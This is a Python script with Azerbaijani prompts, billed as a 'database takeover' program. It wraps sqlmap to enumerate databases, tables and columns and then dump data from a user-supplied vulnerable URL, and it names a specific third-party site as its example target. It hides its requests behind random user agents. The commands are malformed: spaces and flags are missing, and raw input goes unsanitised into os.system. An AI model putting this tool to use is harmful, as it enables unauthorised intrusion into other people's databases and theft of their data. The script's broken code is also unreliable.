#!/usr/bin/env python
import os
os.system ("apt-get install figlet")
os.system ("clear")
os.system ("figlet MELUMAT BAZASI ELE KECIRMEK ")

print("""
MELUMAT BAZASIN ELE KECIRME  PROGRAMINA XOS GELMISINIZ :) 

1)sadece boslugu olan linki bilirem
2)boslugu olan linkve melumat bazasi adin bilirem
3)boslugu olan linki ,melumat bazasi ve cedvelin adin bilirem
4)boslugu olan linki , melumat bazasin , cedvel  ve sutun adin bilirem 

boslugu olan link misali:  https://suesupriano.com/article.php?id=25
""")

emr_no= input("emeliyatin nomresini yazin : ")
if(emr_no=="1"):
    bosluglu_link = input ("boslugu olan linki yazin : ")
    os.system("sqlmap -u " + bosluglu_link + "--dbs --random-agent")
elif(emr_no=="2"):
    bosluglu_link= input( "boslugu olan linki yazin : ")
    melumat_bazasi= input ("melumat bazasi adini yazin : ")
    os.system("sqlmap -u " + bosluglu_link + "-D "+ melumat_bazasi+ "--tables --random-agent")
elif(emr_no=="3"):
    bosluglu_link= input( "boslugu olan linki yazin : ")
    melumat_bazasi= input ("melumat bazasi adini yazin : ")
    cedvel=input("cedvelin adin yazin : ")
    os.system("sqlmap -u " + bosluglu_link + "-D "+ melumat_bazasi+ " - "+cedvel+ " --columns --random-agent")
elif(emr_no=="4"):
    bosluglu_link= input( "boslugu olan linki yazin : ")
    melumat_bazasi= input ("melumat bazasi adini yazin : ")
    cedvel=input("cedvelin adin yazin : ")
    sutun=input("cedvelun sutun adin qeyd edin : ")
    os.system("sqlmap -u " + bosluglu_link + "-D "+ melumat_bazasi+ " - "+cedvel+ "-C "+sutun+ "dump --random-agent")
else :
    print("yanlis secim elediniz , siztem baglanilir ..")
